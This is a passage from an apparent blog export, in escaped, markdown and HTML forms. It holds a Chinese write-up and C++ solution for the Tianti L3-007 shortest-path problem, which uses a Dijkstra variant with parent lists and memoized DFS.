cout &lt;&lt; r1[i] &lt;&lt; \" =&gt; \"; &#125; cout &lt;&lt; r1[r1.size() - 1] &lt;&lt; endl; cout &lt;&lt; \"Distance = \" &lt;&lt; lenEND &lt;&lt; \": \"; for (int i = 0; i &lt; r2.size() - 1; i++) &#123; cout &lt;&lt; r2[i] &lt;&lt; \" =&gt; \"; &#125; cout &lt;&lt; r2[r2.size() - 1] &lt;&lt; endl; &#125; &#125;&#125;// 参数me是该edge的终点，p是该edge的起点，t出发的源节点到这条edge的终点的代价struct Edge_t &#123; int me; int p; int t; Edge_t(int m, int h, int y) : me(m), p(h), t(y) &#123;&#125; bool operator&lt;(const Edge_t &amp;x) const &#123; return x.t &lt; this-&gt;t; &#125;&#125;;// bfs+优先队列其实就是dijstra算法// dijstra维护result set，源节点到这个set里的点的最短路径已经被找到// 所以result set只会有node被加进去而不会有node被踢出去// 不同于算法导论描述的dijstra算法——算导里的堆是点的堆，int dijstra(int weight[][600]) &#123; int resWei[600]; priority_queue&lt;Edge_t&gt; que; que.push(Edge_t(BEGIN, 0, 0));// 后面用到了t.t+weight[t.me][adj[i]]，所以这里必须要取0 int cnt = 0; bool visit[vertexCnt]; // 记录某点是否已经加入到dijstra的result set里 memset(visit, 0, sizeof(visit) * sizeof(bool)); while (!que.empty()) &#123; Edge_t t = que.top(); que.pop(); // 因为这是Edge的堆，可能会有一些边pop出来时，其终点已经在result set里 if (visit[t.me]) &#123; assert(resWei[t.me] &lt;= t.t); if (resWei[t.me] == t.t) &#123; tp[t.me].push_back(t.p); &#125; continue; &#125; visit[t.me] = true; tp[t.me].push_back(t.p); resWei[t.me] = t.t; const vector&lt;int&gt; &amp;adj = v[t.me].adj; int al = adj.size(); for (int i = 0; i &lt; al; i++) &#123; if (adj[i] == t.me) continue; que.push(Edge_t(adj[i], t.me, t.t + weight[t.me][adj[i]])); &#125; &#125; return resWei[END];&#125;int dp[600];bool dpVisit[600];static int __dfs(int f, bool isLength);int DFS(bool isLength) &#123; memset(dp, 0xff, sizeof(dp)); memset(tpResult, 0, sizeof(tpResult)); memset(dpVisit, 0, sizeof(dpVisit)); return __dfs(END, isLength);&#125;static int __dfs(int f, bool isLength) &#123; if (dp[f] &gt; -1) &#123; return dp[f]; &#125; if (f == BEGIN) &#123; return 0; &#125; const vector&lt;int&gt; &amp;t = tp[f]; int result = INF; for (int i = 0; i &lt; t.size(); i++) &#123; if(t[i]==f) continue; if (dpVisit[t[i]]) // 代表该节点在这条路径上已经被访问过 continue; dpVisit[f] = true; int p = __dfs(t[i], isLength) + (isLength ? 1 : length[t[i]][f]); dpVisit[f] = false; if (p &lt; result) &#123; tpResult[f] = t[i]; result = p; &#125; &#125; dp[f] = result; return result;&#125;int path[600];bool outpVisit[600];void outp(int f, int index) &#123; outpVisit[f] = true; if (f == BEGIN) &#123; cout &lt;&lt; \"outp: \"; for (int i = 0; i &lt; index; i++) &#123; cout &lt;&lt; path[i] &lt;&lt; \" \"; &#125; cout &lt;&lt; endl; outpVisit[f] = true; return; &#125; path[index] = f; const vector&lt;int&gt; &amp;t = tp[f]; for (int i = 0; i &lt; t.size(); i++) &#123; if (outpVisit[t[i]])// means that 前辈们已经访问过了，再访问就成环了 continue; outp(t[i], index + 1); &#125; outpVisit[f] = false; return;&#125;","raw":"---\ntitle: 天梯L3 007 天梯地图\ntoc: false\ncomments: true\nmathjax: true\ndate: 2018-05-13 15:10:04\ntags:\n- Dijstra最短路\n- 天梯赛\ndescription: Dijstra最短路变形\ncategories:\n- 算法\n---\n\n## 题目\n\n{% asset_img 1.png %}\n\n#### 输入示例一\n\n```\n10 15\n0 1 0 1 1\n8 0 0 1 1\n4 8 1 1 1\n5 4 0 2 3\n5 9 1 1 4\n0 6 0 1 1\n7 3 1 1 2\n8 3 1 1 2\n2 5 0 2 2\n2 1 1 1 1\n1 5 0 1 3\n1 4 0 1 1\n9 7 1 1 3\n3 1 0 2 5\n6 3 1 2 1\n5 3\n```\n\n#### 输出示例一\n\n```\nTime = 6: 5 => 4 => 8 => 3\nDistance = 3: 5 => 1 => 3\n```\n\n#### 输入示例二\n\n```\n7 9\n0 4 1 1 1\n1 6 1 3 1\n2 6 1 1 1\n2 5 1 2 2\n3 0 0 1 1\n3 1 1 3 1\n3 2 1 2 1\n4 5 0 2 2\n6 5 1 2 1\n3 5\n```\n\n#### 输出示例二\n\n```\nTime = 3; Distance = 4: 3 => 2 => 5\n```\n\n## Dijstra算法\n\n- bfs+优先队列其实就是dijstra算法\n- dijstra维护result set，源节点到这个set里的点的最短路径已经找到，所以result set只会有node被加进去而不会有node被踢出去\n- 不同于算法导论描述的dijstra算法——算导里的堆是点的堆，所以当发现有新的路径可以以更小的代价到达某点时（该点之前已经在堆里），会使用堆decrease key操作——把这个点的权值减低，并且调整堆使得堆合法。但是stl的优先队列并没有decrease key的操作，所以使用另一种实现——允许某点多次加入到优先队列里——其实就等价于优先队列里放Edge。所以在从优先队列里pop出最小权的点时，要判断该点是否已经处于result set里。这样做会使得复杂度从$O((E+V)lgV)$ 变为$O(ElgE)$ \n\n## Dijstra找出所有最短路径\n\n- 从src到dest的路径上的某些节点有多种到达方法——这就导致了多条路径。所以我们要维护所有节点的parent list——无论从哪个parent 到这个节点都是最短的。\n- 具体实现是：从优先队列其pop出某节点，该节点已经处于result set里，但是源节点到该节点的代价与result中的这个节点的路径代价相同，那么这条新的路径就是另一个条到达这个节点的路径。使用一个vector来存储某个节点的parent list——比如`vector<int> parent[600]` ，则`parent[n]` 代表的vector就是编号为n的节点的parent list\n- 然后使用dfs去计算所有可能的路径的另外一种代价——比如此题，以时间为权重的最短路径有多条，但是我们还需要计算出这些路径在使用路径长度作为权重时该路径的代价。这一步可以使用记忆化搜索。\n\n## 需要注意的点\n\n#### 不可以这样寻找同代价的不同parent 节点\n\n- 代码\n\n  ```cpp\n  // 参数me是该edge的终点，p是该edge的起点，t出发的源节点到这条edge的终点的代价\n  // 其实edge t就代表了节点me\n  struct Edge_t {\n      int me;\n      int p;\n      int t;\n      Edge_t(int m, int h, int y) : me(m), p(h), t(y) {} \n      bool operator<(const Edge_t &x) const { return x.t < this->t; }\n  };\n\n  while (!que.empty()) {\n      Edge_t t = que.top();\n      que.pop();\n      while (!que.empty() && que.top().t == t.t && que.top().me == t.me)\n      ...\n  }\n  ```\n\n- 可能某`Edge h` 确实跟pop出来的`Edge t`是代表的是同一个节点——也就是`h.me==t.me` ，并且代价相同。但是在堆中，还有同等代价的`Edge p`，其终点不是`t.me` ——也就是`p.me!=t.me` ，然后该`Edge p` 在堆中的位置处在`Edge h` 前面，所以上面那个while就没办法获得`Edge h` 从而无法获取完整的parent list。\n\n- 另一种情况更为严重——如果某边是0权重，那么就可能出现“把t.me加到result set之后，后面的循环才产生出另一条与src到t.me等代价的路径”——所以当pop出`Edge t` 后立刻寻找同等代价的路径是不行的，因为该边其实还没有进入到堆里\n\n#### 考虑自循环边\n\n- 直接判断要求某点A邻接的点不与A相同即可实现\n\n#### 因为有0权重的边，所以可能有0权重环路，所以后面的dfs要注意\n\n- dfs递归访问某条路径时要维护已经访问到的节点的列表，确保不重复访问该条路径上已经出现过的点，做法是维护一个visit数组，有点类似回溯法\n\n#### INF的取值要注意\n\n- dfs过程中有可能访问的那条路径无法从src到dest，从而递归到最深的那次dfs的调用会返回INF，如果INF是0xFFFFFFF，加上后面的权重，就会溢出，从而使得`INF+weight[i]`不再是INF\n\n#### 自己生成数据对拍时\n\n- 要注意不要生成多重边，网上很多ac的代码都是不支持多重边的\n\n## 代码\n\n```cpp\n#include <algorithm>\n#include <cassert>\n#include <cstdio>\n#include <cstdlib>\n#include <cstring>\n#include <iostream>\n#include <queue>\n#include <vector>\n#define INF 0x3f3f3f3f\n\nusing namespace std;\nstruct Node {\n    int index;\n    vector<int> adj;\n};\nNode v[600];\nint length[600][600]; // length[i][j]记录从node i到node j的length\nint TIME[600][600]; // TIME[i][j]记录从node i到node j的用时\nvector<int> tp[600];// node's parent list\nint tpResult[600];// 最终的node的parent\n\nint BEGIN, END; // 题目输入的天梯队员的起点和要到达的终点\nint vertexCnt, edgeCnt;\n\nint dijstra(int weight[][600]);\nint DFS(bool isLength);\nvoid outp(int f, int index);\n\nint main(int argc, char** argv) {\n    int n, m;\n    while (~scanf(\"%d%d\", &n, &m)) {\n        for (int i = 0; i < n; i++) {\n            for (int j = 0; j < n; j++) {\n                TIME[i][j] = INF;\n            }\n        }\n        for (int i = 0; i < n; i++) {\n            for (int j = 0; j < n; j++) {\n                length[i][j] = INF;\n            }\n        }\n        for (int i = 0; i < n; i++) {\n            v[i].index = i;\n            v[i].adj.clear();\n        }\n        for (int i = 0; i < n; i++) {\n            tp[i].clear();\n        }\n\n        vertexCnt = n, edgeCnt = m;\n        int v1, v2, one, l, t;\n        for (int i = 0; i < m; i++) {\n            scanf(\"%d%d%d%d%d\", &v1, &v2, &one, &l, &t);\n            v[v1].adj.push_back(v2);\n            // 这样做是为了避免输入多重边——比如说从i到j有多条边，那么我们直接选最小代价的边即可\n            length[v1][v2] = length[v1][v2] < l ? length[v1][v2] : l;\n            TIME[v1][v2] = TIME[v1][v2] < t ? TIME[v1][v2] : t;\n            if (!one) {\n                v[v2].adj.push_back(v1);\n                length[v2][v1] = length[v2][v1] < l ? length[v2][v1] : l;\n                TIME[v2][v1] = TIME[v2][v1] < t ? TIME[v2][v1] : t;\n            }\n        }\n        scanf(\"%d%d\", &BEGIN, &END);\n        if (BEGIN == END) {\n            cout << \"Time = \"\n                 << \"0\"\n                 << \"; Distance = \"\n                 << \"0\"\n                 << \": \";\n            cout << BEGIN << \" => \" << END << endl;\n            continue;\n        }\n        if (n == 2) {\n            cout << \"Time = \" << TIME[BEGIN][END] << \"; Distance = \" << length[BEGIN][END] << \": \";\n            cout << BEGIN << \" => \" << END << endl;\n            continue;\n        }\n\n        int timeEND = dijstra(TIME);\n//        outp(END, 0);\n        DFS(false);\n        vector<int> r1, r2;\n        r1.push_back(END);\n        // 以下这种构造路径的方式是建立在起点不同于终点的情况下\n        int tmp_tp = tpResult[END];\n        r1.push_back(tmp_tp);\n        while (tmp_tp != BEGIN) {\n            tmp_tp = tpResult[tmp_tp];\n            r1.push_back(tmp_tp);\n        }\n        reverse(r1.begin(), r1.end());\n\n        for (int i = 0; i < n; i++) {\n            tp[i].clear();\n        }\n        int lenEND = dijstra(length);\n//        outp(END, 0);\n        DFS(true);\n        r2.push_back(END);\n        tmp_tp = tpResult[END];\n        r2.push_back(tmp_tp);\n        while (tmp_tp != BEGIN) {\n            tmp_tp = tpResult[tmp_tp];\n            r2.push_back(tmp_tp);\n        }\n        reverse(r2.begin(), r2.end());\n\n        bool isSame = false;\n        if (r1.size() == r2.size()) {\n            isSame = true;\n            for (int i = 0; i < r1.size(); i++) {\n                isSame = (r1[i] == r2[i]) && isSame;\n            }\n        }\n        if (isSame) {\n            cout << \"Time = \" << timeEND << \"; Distance = \" << lenEND << \": \";\n            for (int i = 0; i < r1.size() - 1; i++) {\n                cout << r1[i] << \" => \";\n            }\n            cout << r1[r1.size() - 1] << endl;\n        } else {\n            cout << \"Time = \" << timeEND << \": \";\n            for (int i = 0; i < r1.size() - 1; i++) {\n                cout << r1[i] << \" => \";\n            }\n            cout << r1[r1.size() - 1] << endl;\n            cout << \"Distance = \" << lenEND << \": \";\n            for (int i = 0; i < r2.size() - 1; i++) {\n                cout << r2[i] << \" => \";\n            }\n            cout << r2[r2.size() - 1] << endl;\n        }\n    }\n}\n\n// 参数me是该edge的终点，p是该edge的起点，t出发的源节点到这条edge的终点的代价\nstruct Edge_t {\n    int me;\n    int p;\n    int t;\n    Edge_t(int m, int h, int y) : me(m), p(h), t(y) {} \n    bool operator<(const Edge_t &x) const { return x.t < this->t; }\n};\n\n// bfs+优先队列其实就是dijstra算法\n// dijstra维护result set，源节点到这个set里的点的最短路径已经被找到\n// 所以result set只会有node被加进去而不会有node被踢出去\n// 不同于算法导论描述的dijstra算法——算导里的堆是点的堆，\nint dijstra(int weight[][600]) {\n    int resWei[600];\n    priority_queue<Edge_t> que;\n    que.push(Edge_t(BEGIN, 0, 0));// 后面用到了t.t+weight[t.me][adj[i]]，所以这里必须要取0\n    int cnt = 0;\n    bool visit[vertexCnt];  // 记录某点是否已经加入到dijstra的result set里\n    memset(visit, 0, sizeof(visit) * sizeof(bool));\n    while (!que.empty()) {\n        Edge_t t = que.top();\n        que.pop();\n        // 因为这是Edge的堆，可能会有一些边pop出来时，其终点已经在result set里\n        if (visit[t.me]) {\n            assert(resWei[t.me] <= t.t);\n            if (resWei[t.me] == t.t) {\n                tp[t.me].push_back(t.p);\n            }\n            continue;\n        }\n        visit[t.me] = true;\n        tp[t.me].push_back(t.p);\n        resWei[t.me] = t.t;\n        const vector<int> &adj = v[t.me].adj;\n        int al = adj.size();\n        for (int i = 0; i < al; i++) {\n            if (adj[i] == t.me)\n                continue;\n            que.push(Edge_t(adj[i], t.me, t.t + weight[t.me][adj[i]]));\n        }\n    }\n    return resWei[END];\n}\n\nint dp[600];\nbool dpVisit[600];\nstatic int __dfs(int f, bool isLength);\nint DFS(bool isLength) {\n    memset(dp, 0xff, sizeof(dp));\n    memset(tpResult, 0, sizeof(tpResult));\n    memset(dpVisit, 0, sizeof(dpVisit));\n    return __dfs(END, isLength);\n}\nstatic int __dfs(int f, bool isLength) {\n    if (dp[f] > -1) {\n        return dp[f];\n    }\n    if (f == BEGIN) {\n        return 0;\n    }\n    const vector<int> &t = tp[f];\n    int result = INF;\n    for (int i = 0; i < t.size(); i++) {\n        if(t[i]==f)\n            continue;\n        if (dpVisit[t[i]])  // 代表该节点在这条路径上已经被访问过\n            continue;\n        dpVisit[f] = true;\n        int p = __dfs(t[i], isLength) + (isLength ? 1 : length[t[i]][f]);\n        dpVisit[f] = false;\n        if (p < result) {\n            tpResult[f] = t[i];\n            result = p;\n        }\n    }\n    dp[f] = result;\n    return result;\n}\n\nint path[600];\nbool outpVisit[600];\nvoid outp(int f, int index) {\n    outpVisit[f] = true;\n    if (f == BEGIN) {\n        cout << \"outp: \";\n        for (int i = 0; i < index; i++) {\n            cout << path[i] << \" \";\n        }\n        cout << endl;\n        outpVisit[f] = true;\n        return;\n    }\n    path[index] = f;\n    const vector<int> &t = tp[f];\n    for (int i = 0; i < t.size(); i++) {\n        if (outpVisit[t[i]])// means that 前辈们已经访问过了，再访问就成环了\n            continue;\n        outp(t[i], index + 1);\n    }\n    outpVisit[f] = false;\n    return;\n}\n```","content":"<h2 id=\"题目\"><a href=\"#题目\" class=\"headerlink\" title=\"题目\"></a>题目</h2><img src=\"/2018/05/13/天梯L3-007-天梯地图/1.png\">\n<h4 id=\"输入示例一\"><a href=\"#输入示例一\" class=\"headerlink\" title=\"输入示例一\"></a>输入示例一</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">10 15</span><br><span class=\"line\">0 1 0 1 1</span><br><span class=\"line\">8 0 0 1 1</span><br><span class=\"line\">4 8 1 1 1</span><br><span class=\"line\">5 4 0 2 3</span><br><span class=\"line\">5 9 1 1 4</span><br><span class=\"line\">0 6 0 1 1</span><br><span class=\"line\">7 3 1 1 2</span><br><span class=\"line\">8 3 1 1 2</span><br><span class=\"line\">2 5 0 2 2</span><br><span class=\"line\">2 1 1 1 1</span><br><span class=\"line\">1 5 0 1 3</span><br><span class=\"line\">1 4 0 1 1</span><br><span class=\"line\">9 7 1 1 3</span><br><span class=\"line\">3 1 0 2 5</span><br><span class=\"line\">6 3 1 2 1</span><br><span class=\"line\">5 3</span><br></pre></td></tr></table></figure>\n<h4 id=\"输出示例一\"><a href=\"#输出示例一\" class=\"headerlink\" title=\"输出示例一\"></a>输出示例一</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Time = 6: 5 =&gt; 4 =&gt; 8 =&gt; 3</span><br><span class=\"line\">Distance = 3: 5 =&gt; 1 =&gt; 3</span><br></pre></td></tr></table></figure>\n<h4 id=\"输入示例二\"><a href=\"#输入示例二\" class=\"headerlink\" title=\"输入示例二\"></a>输入示例二</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">7 9</span><br><span class=\"line\">0 4 1 1 1</span><br><span class=\"line\">1 6 1 3 1</span><br><span class=\"line\">2 6 1 1 1</span><br><span class=\"line\">2 5 1 2 2</span><br><span class=\"line\">3 0 0 1 1</span><br><span class=\"line\">3 1 1 3 1</span><br><span class=\"line\">3 2 1 2 1</span><br><span class=\"line\">4 5 0 2 2</span><br><span class=\"line\">6 5 1 2 1</span><br><span class=\"line\">3 5</span><br></pre></td></tr></table></figure>\n<h4 id=\"输出示例二\"><a href=\"#输出示例二\" class=\"headerlink\" title=\"输出示例二\"></a>输出示例二</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Time = 3; Distance = 4: 3 =&gt; 2 =&gt; 5</span><br></pre></td></tr></table></figure>\n<h2 id=\"Dijstra算法\"><a href=\"#Dijstra算法\" class=\"headerlink\" title=\"Dijstra算法\"></a>Dijstra算法</h2><ul>\n<li>bfs+优先队列其实就是dijstra算法</li>\n<li>dijstra维护result set，源节点到这个set里的点的最短路径已经找到，所以result set只会有node被加进去而不会有node被踢出去</li>\n<li>不同于算法导论描述的dijstra算法——算导里的堆是点的堆，所以当发现有新的路径可以以更小的代价到达某点时（该点之前已经在堆里），会使用堆decrease key操作——把这个点的权值减低，并且调整堆使得堆合法。但是stl的优先队列并没有decrease key的操作，所以使用另一种实现——允许某点多次加入到优先队列里——其实就等价于优先队列里放Edge。所以在从优先队列里pop出最小权的点时，要判断该点是否已经处于result set里。这样做会使得复杂度从$O((E+V)lgV)$ 变为$O(ElgE)$ </li>\n</ul>\n<h2 id=\"Dijstra找出所有最短路径\"><a href=\"#Dijstra找出所有最短路径\" class=\"headerlink\" title=\"Dijstra找出所有最短路径\"></a>Dijstra找出所有最短路径</h2><ul>\n<li>从src到dest的路径上的某些节点有多种到达方法——这就导致了多条路径。所以我们要维护所有节点的parent list——无论从哪个parent 到这个节点都是最短的。</li>\n<li>具体实现是：从优先队列其pop出某节点，该节点已经处于result set里，但是源节点到该节点的代价与result中的这个节点的路径代价相同，那么这条新的路径就是另一个条到达这个节点的路径。使用一个vector来存储某个节点的parent list——比如<code>vector&lt;int&gt; parent[600]</code> ，则<code>parent[n]</code> 代表的vector就是编号为n的节点的parent list</li>\n<li>然后使用dfs去计算所有可能的路径的另外一种代价——比如此题，以时间为权重的最短路径有多条，但是我们还需要计算出这些路径在使用路径长度作为权重时该路径的代价。这一步可以使用记忆化搜索。</li>\n</ul>\n<h2 id=\"需要注意的点\"><a href=\"#需要注意的点\" class=\"headerlink\" title=\"需要注意的点\"></a>需要注意的点</h2><h4 id=\"不可以这样寻找同代价的不同parent-节点\"><a href=\"#不可以这样寻找同代价的不同parent-节点\" class=\"headerlink\" title=\"不可以这样寻找同代价的不同parent 节点\"></a>不可以这样寻找同代价的不同parent 节点</h4><ul>\n<li><p>代码</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 参数me是该edge的终点，p是该edge的起点，t出发的源节点到这条edge的终点的代价</span></span><br><span class=\"line\"><span class=\"comment\">// 其实edge t就代表了节点me</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">Edge_t</span> &#123;</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> me;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> p;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> t;</span><br><span class=\"line\">    Edge_t(<span class=\"keyword\">int</span> m, <span class=\"keyword\">int</span> h, <span class=\"keyword\">int</span> y) : me(m), p(h), t(y) &#123;&#125; </span><br><span class=\"line\">    <span class=\"keyword\">bool</span> <span class=\"keyword\">operator</span>&lt;(<span class=\"keyword\">const</span> Edge_t &amp;x) <span class=\"keyword\">const</span> &#123; <span class=\"keyword\">return</span> x.t &lt; <span class=\"keyword\">this</span>-&gt;t; &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> (!que.empty()) &#123;</span><br><span class=\"line\">    Edge_t t = que.top();</span><br><span class=\"line\">    que.pop();</span><br><span class=\"line\">    <span class=\"keyword\">while</span> (!que.empty() &amp;&amp; que.top().t == t.t &amp;&amp; que.top().me == t.me)</span><br><span class=\"line\">    ...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>可能某<code>Edge h</code> 确实跟pop出来的<code>Edge t</code>是代表的是同一个节点——也就是<code>h.me==t.me</code> ，并且代价相同。但是在堆中，还有同等代价的<code>Edge p</code>，其终点不是<code>t.me</code> ——也就是<code>p.me!=t.me</code> ，然后该<code>Edge p</code> 在堆中的位置处在<code>Edge h</code> 前面，所以上面那个while就没办法获得<code>Edge h</code> 从而无法获取完整的parent list。</p>\n</li>\n<li><p>另一种情况更为严重——如果某边是0权重，那么就可能出现“把t.me加到result set之后，后面的循环才产生出另一条与src到t.me等代价的路径”——所以当pop出<code>Edge t</code> 后立刻寻找同等代价的路径是不行的，因为该边其实还没有进入到堆里</p>\n</li>\n</ul>\n<h4 id=\"考虑自循环边\"><a href=\"#考虑自循环边\" class=\"headerlink\" title=\"考虑自循环边\"></a>考虑自循环边</h4><ul>\n<li>直接判断要求某点A邻接的点不与A相同即可实现</li>\n</ul>\n<h4 id=\"因为有0权重的边，所以可能有0权重环路，所以后面的dfs要注意\"><a href=\"#因为有0权重的边，所以可能有0权重环路，所以后面的dfs要注意\" class=\"headerlink\" title=\"因为有0权重的边，所以可能有0权重环路，所以后面的dfs要注意\"></a>因为有0权重的边，所以可能有0权重环路，所以后面的dfs要注意</h4><ul>\n<li>dfs递归访问某条路径时要维护已经访问到的节点的列表，确保不重复访问该条路径上已经出现过的点，做法是维护一个visit数组，有点类似回溯法</li>\n</ul>\n<h4 id=\"INF的取值要注意\"><a href=\"#INF的取值要注意\" class=\"headerlink\" title=\"INF的取值要注意\"></a>INF的取值要注意</h4><ul>\n<li>dfs过程中有可能访问的那条路径无法从src到dest，从而递归到最深的那次dfs的调用会返回INF，如果INF是0xFFFFFFF，加上后面的权重，就会溢出，从而使得<code>INF+weight[i]</code>不再是INF</li>\n</ul>\n<h4 id=\"自己生成数据对拍时\"><a href=\"#自己生成数据对拍时\" class=\"headerlink\" title=\"自己生成数据对拍时\"></a>自己生成数据对拍时</h4><ul>\n<li>要注意不要生成多重边，网上很多ac的代码都是不支持多重边的</li>\n</ul>\n<h2 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span 